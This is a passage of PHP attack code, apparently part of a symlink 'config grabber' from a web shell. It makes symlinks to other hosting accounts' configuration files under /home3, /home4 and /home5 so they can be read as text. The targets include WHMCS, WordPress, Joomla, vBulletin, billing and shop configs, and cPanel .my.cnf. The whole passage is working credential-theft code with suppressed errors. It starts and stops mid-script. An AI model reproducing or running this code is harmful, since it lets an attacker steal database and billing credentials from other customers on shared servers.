@symlink('/home3/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home3/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home3/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
//Home4

@symlink('/home4/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home4/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home4/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home4/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home4/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home4/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home4/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home4/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home4/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home4/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home4/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home4/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');

//home5

@symlink('/home5/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home5/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home5/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home5/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
